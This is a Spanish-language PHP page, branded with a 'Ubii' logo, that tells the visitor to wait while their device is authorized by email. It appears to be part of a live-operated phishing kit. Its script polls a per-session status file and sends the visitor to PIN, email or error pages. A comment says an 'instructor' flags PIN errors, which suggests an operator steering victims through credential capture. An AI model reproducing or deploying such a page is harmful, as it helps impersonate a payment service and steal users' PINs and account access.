<?php
session_start();
$id_sesion = isset($_SESSION['usuario_id']) ? $_SESSION['usuario_id'] : '';
?>
<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Esperando autorización de dispositivo</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial}
    body{background:#070708;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh}
    .card{width:100%;max-width:420px;padding:32px;border-radius:16px;background:#0f1113;box-shadow:0 12px 40px rgba(0,0,0,.6);text-align:center}
    .logo{margin-bottom:18px}
    .logo img{height:48px;width:auto}
    h2{font-size:20px;margin-bottom:8px;color:#e6eefc}
    p{color:#cfcfcf;margin-bottom:18px}
    .spinner{border:4px solid rgba(255,255,255,0.04);width:56px;height:56px;border-radius:50%;border-left-color:#0099ff;animation:spin 1s linear infinite;margin:12px auto}
    @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
    .note{font-size:13px;color:#9aa0a6;margin-top:10px}
    .btn-small{display:inline-block;margin-top:16px;padding:10px 14px;border-radius:12px;background:#35383e;color:#fff;text-decoration:none}
  </style>
</head>
<body>
  <div class="card" role="main">
    <div class="logo"><img src="LogoUbiiOnline.svg" alt="Ubii"></div>
    <div class="spinner" aria-hidden="true"></div>
    <h2>Esperando autorización de dispositivo</h2>
    <p>Hemos enviado el correo electronico para autorizar este dispositivo. Por favor, revise su bandeja de entrada.</p>
    <div class="note">Debe ingresar a su correo electronico y autorizar para continuar.</div>
    <a class="btn-small" href="noautorizado.php">He autorizado correctamente</a>
  </div>

<script>
const usuarioId = "";

async function chequearEstado() {
  if (!usuarioId) return;
  try {
    const res = await fetch('./sesiones/' + usuarioId + '.json?v=' + new Date().getTime());
    if (!res.ok) return;
    const data = await res.json();
    const estado = data.estado || '';

    if (estado === 'autorizado') {
      window.location.href = 'correo.php';
    } else if (estado === 'no_autorizado') {
      window.location.href = 'noautorizado.php';
    } else if (estado === 'pin_rebotado') {
      // Si instructor marca error de PIN, volvemos al PIN con la alerta
      window.location.href = 'pin.php?error=pin_malo';
    }
  } catch (e) {
    console.log('Esperando autorización...');
  }
}

if (usuarioId) {
  setInterval(chequearEstado, 2000);
}
</script>
</body>
</html>
